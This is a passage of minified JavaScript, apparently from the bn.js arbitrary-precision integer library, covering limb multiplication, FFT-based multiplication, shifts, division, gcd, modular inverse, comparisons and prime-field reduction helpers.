                $ = $ + Math.imul(ct, _t) | 0,
                $ = $ + Math.imul(vt, ht) | 0,
                ie = ie + Math.imul(vt, _t) | 0,
                re = re + Math.imul(Qe, Ye) | 0,
                $ = $ + Math.imul(Qe, it) | 0,
                $ = $ + Math.imul(We, Ye) | 0,
                ie = ie + Math.imul(We, it) | 0,
                re = re + Math.imul(nt, ut) | 0,
                $ = $ + Math.imul(nt, wt) | 0,
                $ = $ + Math.imul(je, ut) | 0,
                ie = ie + Math.imul(je, wt) | 0,
                re = re + Math.imul(qe, St) | 0,
                $ = $ + Math.imul(qe, Tt) | 0,
                $ = $ + Math.imul(Ve, St) | 0,
                ie = ie + Math.imul(Ve, Tt) | 0;
                var dr = (de + re | 0) + (($ & 8191) << 13) | 0;
                de = (ie + ($ >>> 13) | 0) + (dr >>> 26) | 0,
                dr &= 67108863,
                re = Math.imul(ke, Dt),
                $ = Math.imul(ke, Ft),
                $ = $ + Math.imul(Me, Dt) | 0,
                ie = Math.imul(Me, Ft),
                re = re + Math.imul(et, at) | 0,
                $ = $ + Math.imul(et, ze) | 0,
                $ = $ + Math.imul(tt, at) | 0,
                ie = ie + Math.imul(tt, ze) | 0,
                re = re + Math.imul(_e, ht) | 0,
                $ = $ + Math.imul(_e, _t) | 0,
                $ = $ + Math.imul(Ce, ht) | 0,
                ie = ie + Math.imul(Ce, _t) | 0,
                re = re + Math.imul(ct, Ye) | 0,
                $ = $ + Math.imul(ct, it) | 0,
                $ = $ + Math.imul(vt, Ye) | 0,
                ie = ie + Math.imul(vt, it) | 0,
                re = re + Math.imul(Qe, ut) | 0,
                $ = $ + Math.imul(Qe, wt) | 0,
                $ = $ + Math.imul(We, ut) | 0,
                ie = ie + Math.imul(We, wt) | 0,
                re = re + Math.imul(nt, St) | 0,
                $ = $ + Math.imul(nt, Tt) | 0,
                $ = $ + Math.imul(je, St) | 0,
                ie = ie + Math.imul(je, Tt) | 0;
                var nr = (de + re | 0) + (($ & 8191) << 13) | 0;
                de = (ie + ($ >>> 13) | 0) + (nr >>> 26) | 0,
                nr &= 67108863,
                re = Math.imul(ke, at),
                $ = Math.imul(ke, ze),
                $ = $ + Math.imul(Me, at) | 0,
                ie = Math.imul(Me, ze),
                re = re + Math.imul(et, ht) | 0,
                $ = $ + Math.imul(et, _t) | 0,
                $ = $ + Math.imul(tt, ht) | 0,
                ie = ie + Math.imul(tt, _t) | 0,
                re = re + Math.imul(_e, Ye) | 0,
                $ = $ + Math.imul(_e, it) | 0,
                $ = $ + Math.imul(Ce, Ye) | 0,
                ie = ie + Math.imul(Ce, it) | 0,
                re = re + Math.imul(ct, ut) | 0,
                $ = $ + Math.imul(ct, wt) | 0,
                $ = $ + Math.imul(vt, ut) | 0,
                ie = ie + Math.imul(vt, wt) | 0,
                re = re + Math.imul(Qe, St) | 0,
                $ = $ + Math.imul(Qe, Tt) | 0,
                $ = $ + Math.imul(We, St) | 0,
                ie = ie + Math.imul(We, Tt) | 0;
                var lr = (de + re | 0) + (($ & 8191) << 13) | 0;
                de = (ie + ($ >>> 13) | 0) + (lr >>> 26) | 0,
                lr &= 67108863,
                re = Math.imul(ke, ht),
                $ = Math.imul(ke, _t),
                $ = $ + Math.imul(Me, ht) | 0,
                ie = Math.imul(Me, _t),
                re = re + Math.imul(et, Ye) | 0,
                $ = $ + Math.imul(et, it) | 0,
                $ = $ + Math.imul(tt, Ye) | 0,
                ie = ie + Math.imul(tt, it) | 0,
                re = re + Math.imul(_e, ut) | 0,
                $ = $ + Math.imul(_e, wt) | 0,
                $ = $ + Math.imul(Ce, ut) | 0,
                ie = ie + Math.imul(Ce, wt) | 0,
                re = re + Math.imul(ct, St) | 0,
                $ = $ + Math.imul(ct, Tt) | 0,
                $ = $ + Math.imul(vt, St) | 0,
                ie = ie + Math.imul(vt, Tt) | 0;
                var fr = (de + re | 0) + (($ & 8191) << 13) | 0;
                de = (ie + ($ >>> 13) | 0) + (fr >>> 26) | 0,
                fr &= 67108863,
                re = Math.imul(ke, Ye),
                $ = Math.imul(ke, it),
                $ = $ + Math.imul(Me, Ye) | 0,
                ie = Math.imul(Me, it),
                re = re + Math.imul(et, ut) | 0,
                $ = $ + Math.imul(et, wt) | 0,
                $ = $ + Math.imul(tt, ut) | 0,
                ie = ie + Math.imul(tt, wt) | 0,
                re = re + Math.imul(_e, St) | 0,
                $ = $ + Math.imul(_e, Tt) | 0,
                $ = $ + Math.imul(Ce, St) | 0,
                ie = ie + Math.imul(Ce, Tt) | 0;
                var ir = (de + re | 0) + (($ & 8191) << 13) | 0;
                de = (ie + ($ >>> 13) | 0) + (ir >>> 26) | 0,
                ir &= 67108863,
                re = Math.imul(ke, ut),
                $ = Math.imul(ke, wt),
                $ = $ + Math.imul(Me, ut) | 0,
                ie = Math.imul(Me, wt),
                re = re + Math.imul(et, St) | 0,
                $ = $ + Math.imul(et, Tt) | 0,
                $ = $ + Math.imul(tt, St) | 0,
                ie = ie + Math.imul(tt, Tt) | 0;
                var $t = (de + re | 0) + (($ & 8191) << 13) | 0;
                de = (ie + ($ >>> 13) | 0) + ($t >>> 26) | 0,
                $t &= 67108863,
                re = Math.imul(ke, St),
                $ = Math.imul(ke, Tt),
                $ = $ + Math.imul(Me, St) | 0,
                ie = Math.imul(Me, Tt);
                var Nt = (de + re | 0) + (($ & 8191) << 13) | 0;
                return de = (ie + ($ >>> 13) | 0) + (Nt >>> 26) | 0,
                Nt &= 67108863,
                se[0] = er,
                se[1] = Xt,
                se[2] = pr,
                se[3] = or,
                se[4] = yr,
                se[5] = vr,
                se[6] = gr,
                se[7] = Sr,
                se[8] = br,
                se[9] = _r,
                se[10] = wr,
                se[11] = sr,
                se[12] = dr,
                se[13] = nr,
                se[14] = lr,
                se[15] = fr,
                se[16] = ir,
                se[17] = $t,
                se[18] = Nt,
                de !== 0 && (se[19] = de,
                U.length++),
                U
            };
            Math.imul || (ne = ae);
            function oe(ce, q, L) {
                L.negative = q.negative ^ ce.negative,
                L.length = ce.length + q.length;
                for (var U = 0, Z = 0, te = 0; te < L.length - 1; te++) {
                    var se = Z;
                    Z = 0;
                    for (var de = U & 67108863, re = Math.min(te, q.length - 1), $ = Math.max(0, te - ce.length + 1); $ <= re; $++) {
                        var ie = te - $
                          , ve = ce.words[ie] | 0
                          , ge = q.words[$] | 0
                          , Re = ve * ge
                          , Pe = Re & 67108863;
                        se = se + (Re / 67108864 | 0) | 0,
                        Pe = Pe + de | 0,
                        de = Pe & 67108863,
                        se = se + (Pe >>> 26) | 0,
                        Z += se >>> 26,
                        se &= 67108863
                    }
                    L.words[te] = de,
                    U = se,
                    se = Z
                }
                return U !== 0 ? L.words[te] = U : L.length--,
                L.strip()
            }
            function ue(ce, q, L) {
                var U = new fe;
                return U.mulp(ce, q, L)
            }
            w.prototype.mulTo = function(q, L) {
                var U, Z = this.length + q.length;
                return this.length === 10 && q.length === 10 ? U = ne(this, q, L) : Z < 63 ? U = ae(this, q, L) : Z < 1024 ? U = oe(this, q, L) : U = ue(this, q, L),
                U
            }
            ;
            function fe(ce, q) {
                this.x = ce,
                this.y = q
            }
            fe.prototype.makeRBT = function(q) {
                for (var L = new Array(q), U = w.prototype._countBits(q) - 1, Z = 0; Z < q; Z++)
                    L[Z] = this.revBin(Z, U, q);
                return L
            }
            ,
            fe.prototype.revBin = function(q, L, U) {
                if (q === 0 || q === U - 1)
                    return q;
                for (var Z = 0, te = 0; te < L; te++)
                    Z |= (q & 1) << L - te - 1,
                    q >>= 1;
                return Z
            }
            ,
            fe.prototype.permute = function(q, L, U, Z, te, se) {
                for (var de = 0; de < se; de++)
                    Z[de] = L[q[de]],
                    te[de] = U[q[de]]
            }
            ,
            fe.prototype.transform = function(q, L, U, Z, te, se) {
                this.permute(se, q, L, U, Z, te);
                for (var de = 1; de < te; de <<= 1)
                    for (var re = de << 1, $ = Math.cos(2 * Math.PI / re), ie = Math.sin(2 * Math.PI / re), ve = 0; ve < te; ve += re)
                        for (var ge = $, Re = ie, Pe = 0; Pe < de; Pe++) {
                            var Ie = U[ve + Pe]
                              , Te = Z[ve + Pe]
                              , Le = U[ve + Pe + de]
                              , Ze = Z[ve + Pe + de]
                              , $e = ge * Le - Re * Ze;
                            Ze = ge * Ze + Re * Le,
                            Le = $e,
                            U[ve + Pe] = Ie + Le,
                            Z[ve + Pe] = Te + Ze,
                            U[ve + Pe + de] = Ie - Le,
                            Z[ve + Pe + de] = Te - Ze,
                            Pe !== re && ($e = $ * ge - ie * Re,
                            Re = $ * Re + ie * ge,
                            ge = $e)
                        }
            }
            ,
            fe.prototype.guessLen13b = function(q, L) {
                var U = Math.max(L, q) | 1
                  , Z = U & 1
                  , te = 0;
                for (U = U / 2 | 0; U; U = U >>> 1)
                    te++;
                return 1 << te + 1 + Z
            }
            ,
            fe.prototype.conjugate = function(q, L, U) {
                if (!(U <= 1))
                    for (var Z = 0; Z < U / 2; Z++) {
                        var te = q[Z];
                        q[Z] = q[U - Z - 1],
                        q[U - Z - 1] = te,
                        te = L[Z],
                        L[Z] = -L[U - Z - 1],
                        L[U - Z - 1] = -te
                    }
            }
            ,
            fe.prototype.normalize13b = function(q, L) {
                for (var U = 0, Z = 0; Z < L / 2; Z++) {
                    var te = Math.round(q[2 * Z + 1] / L) * 8192 + Math.round(q[2 * Z] / L) + U;
                    q[Z] = te & 67108863,
                    te < 67108864 ? U = 0 : U = te / 67108864 | 0
                }
                return q
            }
            ,
            fe.prototype.convert13b = function(q, L, U, Z) {
                for (var te = 0, se = 0; se < L; se++)
                    te = te + (q[se] | 0),
                    U[2 * se] = te & 8191,
                    te = te >>> 13,
                    U[2 * se + 1] = te & 8191,
                    te = te >>> 13;
                for (se = 2 * L; se < Z; ++se)
                    U[se] = 0;
                O(te === 0),
                O((te & -8192) === 0)
            }
            ,
            fe.prototype.stub = function(q) {
                for (var L = new Array(q), U = 0; U < q; U++)
                    L[U] = 0;
                return L
            }
            ,
            fe.prototype.mulp = function(q, L, U) {
                var Z = 2 * this.guessLen13b(q.length, L.length)
                  , te = this.makeRBT(Z)
                  , se = this.stub(Z)
                  , de = new Array(Z)
                  , re = new Array(Z)
                  , $ = new Array(Z)
                  , ie = new Array(Z)
                  , ve = new Array(Z)
                  , ge = new Array(Z)
                  , Re = U.words;
                Re.length = Z,
                this.convert13b(q.words, q.length, de, Z),
                this.convert13b(L.words, L.length, ie, Z),
                this.transform(de, se, re, $, Z, te),
                this.transform(ie, se, ve, ge, Z, te);
                for (var Pe = 0; Pe < Z; Pe++) {
                    var Ie = re[Pe] * ve[Pe] - $[Pe] * ge[Pe];
                    $[Pe] = re[Pe] * ge[Pe] + $[Pe] * ve[Pe],
                    re[Pe] = Ie
                }
                return this.conjugate(re, $, Z),
                this.transform(re, $, Re, se, Z, te),
                this.conjugate(Re, se, Z),
                this.normalize13b(Re, Z),
                U.negative = q.negative ^ L.negative,
                U.length = q.length + L.length,
                U.strip()
            }
            ,
            w.prototype.mul = function(q) {
                var L = new w(null);
                return L.words = new Array(this.length + q.length),
                this.mulTo(q, L)
            }
            ,
            w.prototype.mulf = function(q) {
                var L = new w(null);
                return L.words = new Array(this.length + q.length),
                ue(this, q, L)
            }
            ,
            w.prototype.imul = function(q) {
                return this.clone().mulTo(q, this)
            }
            ,
            w.prototype.imuln = function(q) {
                O(typeof q == "number"),
                O(q < 67108864);
                for (var L = 0, U = 0; U < this.length; U++) {
                    var Z = (this.words[U] | 0) * q
                      , te = (Z & 67108863) + (L & 67108863);
                    L >>= 26,
                    L += Z / 67108864 | 0,
                    L += te >>> 26,
                    this.words[U] = te & 67108863
                }
                return L !== 0 && (this.words[U] = L,
                this.length++),
                this.length = q === 0 ? 1 : this.length,
                this
            }
            ,
            w.prototype.muln = function(q) {
                return this.clone().imuln(q)
            }
            ,
            w.prototype.sqr = function() {
                return this.mul(this)
            }
            ,
            w.prototype.isqr = function() {
                return this.imul(this.clone())
            }
            ,
            w.prototype.pow = function(q) {
                var L = ee(q);
                if (L.length === 0)
                    return new w(1);
                for (var U = this, Z = 0; Z < L.length && L[Z] === 0; Z++,
                U = U.sqr())
                    ;
                if (++Z < L.length)
                    for (var te = U.sqr(); Z < L.length; Z++,
                    te = te.sqr())
                        L[Z] !== 0 && (U = U.mul(te));
                return U
            }
            ,
            w.prototype.iushln = function(q) {
                O(typeof q == "number" && q >= 0);
                var L = q % 26, U = (q - L) / 26, Z = 67108863 >>> 26 - L << 26 - L, te;
                if (L !== 0) {
                    var se = 0;
                    for (te = 0; te < this.length; te++) {
                        var de = this.words[te] & Z
                          , re = (this.words[te] | 0) - de << L;
                        this.words[te] = re | se,
                        se = de >>> 26 - L
                    }
                    se && (this.words[te] = se,
                    this.length++)
                }
                if (U !== 0) {
                    for (te = this.length - 1; te >= 0; te--)
                        this.words[te + U] = this.words[te];
                    for (te = 0; te < U; te++)
                        this.words[te] = 0;
                    this.length += U
                }
                return this.strip()
            }
            ,
            w.prototype.ishln = function(q) {
                return O(this.negative === 0),
                this.iushln(q)
            }
            ,
            w.prototype.iushrn = function(q, L, U) {
                O(typeof q == "number" && q >= 0);
                var Z;
                L ? Z = (L - L % 26) / 26 : Z = 0;
                var te = q % 26
                  , se = Math.min((q - te) / 26, this.length)
                  , de = 67108863 ^ 67108863 >>> te << te
                  , re = U;
                if (Z -= se,
                Z = Math.max(0, Z),
                re) {
                    for (var $ = 0; $ < se; $++)
                        re.words[$] = this.words[$];
                    re.length = se
                }
                if (se !== 0)
                    if (this.length > se)
                        for (this.length -= se,
                        $ = 0; $ < this.length; $++)
                            this.words[$] = this.words[$ + se];
                    else
                        this.words[0] = 0,
                        this.length = 1;
                var ie = 0;
                for ($ = this.length - 1; $ >= 0 && (ie !== 0 || $ >= Z); $--) {
                    var ve = this.words[$] | 0;
                    this.words[$] = ie << 26 - te | ve >>> te,
                    ie = ve & de
                }
                return re && ie !== 0 && (re.words[re.length++] = ie),
                this.length === 0 && (this.words[0] = 0,
                this.length = 1),
                this.strip()
            }
            ,
            w.prototype.ishrn = function(q, L, U) {
                return O(this.negative === 0),
                this.iushrn(q, L, U)
            }
            ,
            w.prototype.shln = function(q) {
                return this.clone().ishln(q)
            }
            ,
            w.prototype.ushln = function(q) {
                return this.clone().iushln(q)
            }
            ,
            w.prototype.shrn = function(q) {
                return this.clone().ishrn(q)
            }
            ,
            w.prototype.ushrn = function(q) {
                return this.clone().iushrn(q)
            }
            ,
            w.prototype.testn = function(q) {
                O(typeof q == "number" && q >= 0);
                var L = q % 26
                  , U = (q - L) / 26
                  , Z = 1 << L;
                if (this.length <= U)
                    return !1;
                var te = this.words[U];
                return !!(te & Z)
            }
            ,
            w.prototype.imaskn = function(q) {
                O(typeof q == "number" && q >= 0);
                var L = q % 26
                  , U = (q - L) / 26;
                if (O(this.negative === 0, "imaskn works only with positive numbers"),
                this.length <= U)
                    return this;
                if (L !== 0 && U++,
                this.length = Math.min(U, this.length),
                L !== 0) {
                    var Z = 67108863 ^ 67108863 >>> L << L;
                    this.words[this.length - 1] &= Z
                }
                return this.strip()
            }
            ,
            w.prototype.maskn = function(q) {
                return this.clone().imaskn(q)
            }
            ,
            w.prototype.iaddn = function(q) {
                return O(typeof q == "number"),
                O(q < 67108864),
                q < 0 ? this.isubn(-q) : this.negative !== 0 ? this.length === 1 && (this.words[0] | 0) < q ? (this.words[0] = q - (this.words[0] | 0),
                this.negative = 0,
                this) : (this.negative = 0,
                this.isubn(q),
                this.negative = 1,
                this) : this._iaddn(q)
            }
            ,
            w.prototype._iaddn = function(q) {
                this.words[0] += q;
                for (var L = 0; L < this.length && this.words[L] >= 67108864; L++)
                    this.words[L] -= 67108864,
                    L === this.length - 1 ? this.words[L + 1] = 1 : this.words[L + 1]++;
                return this.length = Math.max(this.length, L + 1),
                this
            }
            ,
            w.prototype.isubn = function(q) {
                if (O(typeof q == "number"),
                O(q < 67108864),
                q < 0)
                    return this.iaddn(-q);
                if (this.negative !== 0)
                    return this.negative = 0,
                    this.iaddn(q),
                    this.negative = 1,
                    this;
                if (this.words[0] -= q,
                this.length === 1 && this.words[0] < 0)
                    this.words[0] = -this.words[0],
                    this.negative = 1;
                else
                    for (var L = 0; L < this.length && this.words[L] < 0; L++)
                        this.words[L] += 67108864,
                        this.words[L + 1] -= 1;
                return this.strip()
            }
            ,
            w.prototype.addn = function(q) {
                return this.clone().iaddn(q)
            }
            ,
            w.prototype.subn = function(q) {
                return this.clone().isubn(q)
            }
            ,
            w.prototype.iabs = function() {
                return this.negative = 0,
                this
            }
            ,
            w.prototype.abs = function() {
                return this.clone().iabs()
            }
            ,
            w.prototype._ishlnsubmul = function(q, L, U) {
                var Z = q.length + U, te;
                this._expand(Z);
                var se, de = 0;
                for (te = 0; te < q.length; te++) {
                    se = (this.words[te + U] | 0) + de;
                    var re = (q.words[te] | 0) * L;
                    se -= re & 67108863,
                    de = (se >> 26) - (re / 67108864 | 0),
                    this.words[te + U] = se & 67108863
                }
                for (; te < this.length - U; te++)
                    se = (this.words[te + U] | 0) + de,
                    de = se >> 26,
                    this.words[te + U] = se & 67108863;
                if (de === 0)
                    return this.strip();
                for (O(de === -1),
                de = 0,
                te = 0; te < this.length; te++)
                    se = -(this.words[te] | 0) + de,
                    de = se >> 26,
                    this.words[te] = se & 67108863;
                return this.negative = 1,
                this.strip()
            }
            ,
            w.prototype._wordDiv = function(q, L) {
                var U = this.length - q.length
                  , Z = this.clone()
                  , te = q
                  , se = te.words[te.length - 1] | 0
                  , de = this._countBits(se);
                U = 26 - de,
                U !== 0 && (te = te.ushln(U),
                Z.iushln(U),
                se = te.words[te.length - 1] | 0);
                var re = Z.length - te.length, $;
                if (L !== "mod") {
                    $ = new w(null),
                    $.length = re + 1,
                    $.words = new Array($.length);
                    for (var ie = 0; ie < $.length; ie++)
                        $.words[ie] = 0
                }
                var ve = Z.clone()._ishlnsubmul(te, 1, re);
                ve.negative === 0 && (Z = ve,
                $ && ($.words[re] = 1));
                for (var ge = re - 1; ge >= 0; ge--) {
                    var Re = (Z.words[te.length + ge] | 0) * 67108864 + (Z.words[te.length + ge - 1] | 0);
                    for (Re = Math.min(Re / se | 0, 67108863),
                    Z._ishlnsubmul(te, Re, ge); Z.negative !== 0; )
                        Re--,
                        Z.negative = 0,
                        Z._ishlnsubmul(te, 1, ge),
                        Z.isZero() || (Z.negative ^= 1);
                    $ && ($.words[ge] = Re)
                }
                return $ && $.strip(),
                Z.strip(),
                L !== "div" && U !== 0 && Z.iushrn(U),
                {
                    div: $ || null,
                    mod: Z
                }
            }
            ,
            w.prototype.divmod = function(q, L, U) {
                if (O(!q.isZero()),
                this.isZero())
                    return {
                        div: new w(0),
                        mod: new w(0)
                    };
                var Z, te, se;
                return this.negative !== 0 && q.negative === 0 ? (se = this.neg().divmod(q, L),
                L !== "mod" && (Z = se.div.neg()),
                L !== "div" && (te = se.mod.neg(),
                U && te.negative !== 0 && te.iadd(q)),
                {
                    div: Z,
                    mod: te
                }) : this.negative === 0 && q.negative !== 0 ? (se = this.divmod(q.neg(), L),
                L !== "mod" && (Z = se.div.neg()),
                {
                    div: Z,
                    mod: se.mod
                }) : (this.negative & q.negative) !== 0 ? (se = this.neg().divmod(q.neg(), L),
                L !== "div" && (te = se.mod.neg(),
                U && te.negative !== 0 && te.isub(q)),
                {
                    div: se.div,
                    mod: te
                }) : q.length > this.length || this.cmp(q) < 0 ? {
                    div: new w(0),
                    mod: this
                } : q.length === 1 ? L === "div" ? {
                    div: this.divn(q.words[0]),
                    mod: null
                } : L === "mod" ? {
                    div: null,
                    mod: new w(this.modn(q.words[0]))
                } : {
                    div: this.divn(q.words[0]),
                    mod: new w(this.modn(q.words[0]))
                } : this._wordDiv(q, L)
            }
            ,
            w.prototype.div = function(q) {
                return this.divmod(q, "div", !1).div
            }
            ,
            w.prototype.mod = function(q) {
                return this.divmod(q, "mod", !1).mod
            }
            ,
            w.prototype.umod = function(q) {
                return this.divmod(q, "mod", !0).mod
            }
            ,
            w.prototype.divRound = function(q) {
                var L = this.divmod(q);
                if (L.mod.isZero())
                    return L.div;
                var U = L.div.negative !== 0 ? L.mod.isub(q) : L.mod
                  , Z = q.ushrn(1)
                  , te = q.andln(1)
                  , se = U.cmp(Z);
                return se < 0 || te === 1 && se === 0 ? L.div : L.div.negative !== 0 ? L.div.isubn(1) : L.div.iaddn(1)
            }
            ,
            w.prototype.modn = function(q) {
                O(q <= 67108863);
                for (var L = (1 << 26) % q, U = 0, Z = this.length - 1; Z >= 0; Z--)
                    U = (L * U + (this.words[Z] | 0)) % q;
                return U
            }
            ,
            w.prototype.idivn = function(q) {
                O(q <= 67108863);
                for (var L = 0, U = this.length - 1; U >= 0; U--) {
                    var Z = (this.words[U] | 0) + L * 67108864;
                    this.words[U] = Z / q | 0,
                    L = Z % q
                }
                return this.strip()
            }
            ,
            w.prototype.divn = function(q) {
                return this.clone().idivn(q)
            }
            ,
            w.prototype.egcd = function(q) {
                O(q.negative === 0),
                O(!q.isZero());
                var L = this
                  , U = q.clone();
                L.negative !== 0 ? L = L.umod(q) : L = L.clone();
                for (var Z = new w(1), te = new w(0), se = new w(0), de = new w(1), re = 0; L.isEven() && U.isEven(); )
                    L.iushrn(1),
                    U.iushrn(1),
                    ++re;
                for (var $ = U.clone(), ie = L.clone(); !L.isZero(); ) {
                    for (var ve = 0, ge = 1; (L.words[0] & ge) === 0 && ve < 26; ++ve,
                    ge <<= 1)
                        ;
                    if (ve > 0)
                        for (L.iushrn(ve); ve-- > 0; )
                            (Z.isOdd() || te.isOdd()) && (Z.iadd($),
                            te.isub(ie)),
                            Z.iushrn(1),
                            te.iushrn(1);
                    for (var Re = 0, Pe = 1; (U.words[0] & Pe) === 0 && Re < 26; ++Re,
                    Pe <<= 1)
                        ;
                    if (Re > 0)
                        for (U.iushrn(Re); Re-- > 0; )
                            (se.isOdd() || de.isOdd()) && (se.iadd($),
                            de.isub(ie)),
                            se.iushrn(1),
                            de.iushrn(1);
                    L.cmp(U) >= 0 ? (L.isub(U),
                    Z.isub(se),
                    te.isub(de)) : (U.isub(L),
                    se.isub(Z),
                    de.isub(te))
                }
                return {
                    a: se,
                    b: de,
                    gcd: U.iushln(re)
                }
            }
            ,
            w.prototype._invmp = function(q) {
                O(q.negative === 0),
                O(!q.isZero());
                var L = this
                  , U = q.clone();
                L.negative !== 0 ? L = L.umod(q) : L = L.clone();
                for (var Z = new w(1), te = new w(0), se = U.clone(); L.cmpn(1) > 0 && U.cmpn(1) > 0; ) {
                    for (var de = 0, re = 1; (L.words[0] & re) === 0 && de < 26; ++de,
                    re <<= 1)
                        ;
                    if (de > 0)
                        for (L.iushrn(de); de-- > 0; )
                            Z.isOdd() && Z.iadd(se),
                            Z.iushrn(1);
                    for (var $ = 0, ie = 1; (U.words[0] & ie) === 0 && $ < 26; ++$,
                    ie <<= 1)
                        ;
                    if ($ > 0)
                        for (U.iushrn($); $-- > 0; )
                            te.isOdd() && te.iadd(se),
                            te.iushrn(1);
                    L.cmp(U) >= 0 ? (L.isub(U),
                    Z.isub(te)) : (U.isub(L),
                    te.isub(Z))
                }
                var ve;
                return L.cmpn(1) === 0 ? ve = Z : ve = te,
                ve.cmpn(0) < 0 && ve.iadd(q),
                ve
            }
            ,
            w.prototype.gcd = function(q) {
                if (this.isZero())
                    return q.abs();
                if (q.isZero())
                    return this.abs();
                var L = this.clone()
                  , U = q.clone();
                L.negative = 0,
                U.negative = 0;
                for (var Z = 0; L.isEven() && U.isEven(); Z++)
                    L.iushrn(1),
                    U.iushrn(1);
                do {
                    for (; L.isEven(); )
                        L.iushrn(1);
                    for (; U.isEven(); )
                        U.iushrn(1);
                    var te = L.cmp(U);
                    if (te < 0) {
                        var se = L;
                        L = U,
                        U = se
                    } else if (te === 0 || U.cmpn(1) === 0)
                        break;
                    L.isub(U)
                } while (!0);
                return U.iushln(Z)
            }
            ,
            w.prototype.invm = function(q) {
                return this.egcd(q).a.umod(q)
            }
            ,
            w.prototype.isEven = function() {
                return (this.words[0] & 1) === 0
            }
            ,
            w.prototype.isOdd = function() {
                return (this.words[0] & 1) === 1
            }
            ,
            w.prototype.andln = function(q) {
                return this.words[0] & q
            }
            ,
            w.prototype.bincn = function(q) {
                O(typeof q == "number");
                var L = q % 26
                  , U = (q - L) / 26
                  , Z = 1 << L;
                if (this.length <= U)
                    return this._expand(U + 1),
                    this.words[U] |= Z,
                    this;
                for (var te = Z, se = U; te !== 0 && se < this.length; se++) {
                    var de = this.words[se] | 0;
                    de += te,
                    te = de >>> 26,
                    de &= 67108863,
                    this.words[se] = de
                }
                return te !== 0 && (this.words[se] = te,
                this.length++),
                this
            }
            ,
            w.prototype.isZero = function() {
                return this.length === 1 && this.words[0] === 0
            }
            ,
            w.prototype.cmpn = function(q) {
                var L = q < 0;
                if (this.negative !== 0 && !L)
                    return -1;
                if (this.negative === 0 && L)
                    return 1;
                this.strip();
                var U;
                if (this.length > 1)
                    U = 1;
                else {
                    L && (q = -q),
                    O(q <= 67108863, "Number is too big");
                    var Z = this.words[0] | 0;
                    U = Z === q ? 0 : Z < q ? -1 : 1
                }
                return this.negative !== 0 ? -U | 0 : U
            }
            ,
            w.prototype.cmp = function(q) {
                if (this.negative !== 0 && q.negative === 0)
                    return -1;
                if (this.negative === 0 && q.negative !== 0)
                    return 1;
                var L = this.ucmp(q);
                return this.negative !== 0 ? -L | 0 : L
            }
            ,
            w.prototype.ucmp = function(q) {
                if (this.length > q.length)
                    return 1;
                if (this.length < q.length)
                    return -1;
                for (var L = 0, U = this.length - 1; U >= 0; U--) {
                    var Z = this.words[U] | 0
                      , te = q.words[U] | 0;
                    if (Z !== te) {
                        Z < te ? L = -1 : Z > te && (L = 1);
                        break
                    }
                }
                return L
            }
            ,
            w.prototype.gtn = function(q) {
                return this.cmpn(q) === 1
            }
            ,
            w.prototype.gt = function(q) {
                return this.cmp(q) === 1
            }
            ,
            w.prototype.gten = function(q) {
                return this.cmpn(q) >= 0
            }
            ,
            w.prototype.gte = function(q) {
                return this.cmp(q) >= 0
            }
            ,
            w.prototype.ltn = function(q) {
                return this.cmpn(q) === -1
            }
            ,
            w.prototype.lt = function(q) {
                return this.cmp(q) === -1
            }
            ,
            w.prototype.lten = function(q) {
                return this.cmpn(q) <= 0
            }
            ,
            w.prototype.lte = function(q) {
                return this.cmp(q) <= 0
            }
            ,
            w.prototype.eqn = function(q) {
                return this.cmpn(q) === 0
            }
            ,
            w.prototype.eq = function(q) {
                return this.cmp(q) === 0
            }
            ,
            w.red = function(q) {
                return new Ee(q)
            }
            ,
            w.prototype.toRed = function(q) {
                return O(!this.red, "Already a number in reduction context"),
                O(this.negative === 0, "red works only with positives"),
                q.convertTo(this)._forceRed(q)
            }
            ,
            w.prototype.fromRed = function() {
                return O(this.red, "fromRed works only with numbers in reduction context"),
                this.red.convertFrom(this)
            }
            ,
            w.prototype._forceRed = function(q) {
                return this.red = q,
                this
            }
            ,
            w.prototype.forceRed = function(q) {
                return O(!this.red, "Already a number in reduction context"),
                this._forceRed(q)
            }
            ,
            w.prototype.redAdd = function(q) {
                return O(this.red, "redAdd works only with red numbers"),
                this.red.add(this, q)
            }
            ,
            w.prototype.redIAdd = function(q) {
                return O(this.red, "redIAdd works only with red numbers"),
                this.red.iadd(this, q)
            }
            ,
            w.prototype.redSub = function(q) {
                return O(this.red, "redSub works only with red numbers"),
                this.red.sub(this, q)
            }
            ,
            w.prototype.redISub = function(q) {
                return O(this.red, "redISub works only with red numbers"),
                this.red.isub(this, q)
            }
            ,
            w.prototype.redShl = function(q) {
                return O(this.red, "redShl works only with red numbers"),
                this.red.shl(this, q)
            }
            ,
            w.prototype.redMul = function(q) {
                return O(this.red, "redMul works only with red numbers"),
                this.red._verify2(this, q),
                this.red.mul(this, q)
            }
            ,
            w.prototype.redIMul = function(q) {
                return O(this.red, "redMul works only with red numbers"),
                this.red._verify2(this, q),
                this.red.imul(this, q)
            }
            ,
            w.prototype.redSqr = function() {
                return O(this.red, "redSqr works only with red numbers"),
                this.red._verify1(this),
                this.red.sqr(this)
            }
            ,
            w.prototype.redISqr = function() {
                return O(this.red, "redISqr works only with red numbers"),
                this.red._verify1(this),
                this.red.isqr(this)
            }
            ,
            w.prototype.redSqrt = function() {
                return O(this.red, "redSqrt works only with red numbers"),
                this.red._verify1(this),
                this.red.sqrt(this)
            }
            ,
            w.prototype.redInvm = function() {
                return O(this.red, "redInvm works only with red numbers"),
                this.red._verify1(this),
                this.red.invm(this)
            }
            ,
            w.prototype.redNeg = function() {
                return O(this.red, "redNeg works only with red numbers"),
                this.red._verify1(this),
                this.red.neg(this)
            }
            ,
            w.prototype.redPow = function(q) {
                return O(this.red && !q.red, "redPow(normalNum)"),
                this.red._verify1(this),
                this.red.pow(this, q)
            }
            ;
            var he = {
                k256: null,
                p224: null,
                p192: null,
                p25519: null
            };
            function pe(ce, q) {
                this.name = ce,
                this.p = new w(q,16),
                this.n = this.p.bitLength(),
                this.k = new w(1).iushln(this.n).isub(this.p),
                this.tmp = this._tmp()
            }
            pe.prototype._tmp = function() {
                var q = new w(null);
                return q.words = new Array(Math.ceil(this.n / 13)),
                q
            }
            ,
            pe.prototype.ireduce = function(q) {
                var L = q, U;
                do
                    this.split(L, this.tmp),
                    L = this.imulK(L),
                    L = L.iadd(this.tmp),
                    U = L.bitLength();
                while (U > this.n);
                var Z = U < this.n ? -1 : L.ucmp(this.p);
                return Z === 0 ? (L.words[0] = 0,
                L.length = 1) : Z > 0 ? L.isub(this.p) : L.strip !== void 0 ? L.strip() : L._strip(),
                L
            }
            ,
            pe.prototype.split = function(q, L) {
                q.iushrn(this.n, 0, L)
            }
            ,
            pe.prototype.imulK = function(q) {
                return q.imul(this.k)
            }
            ;
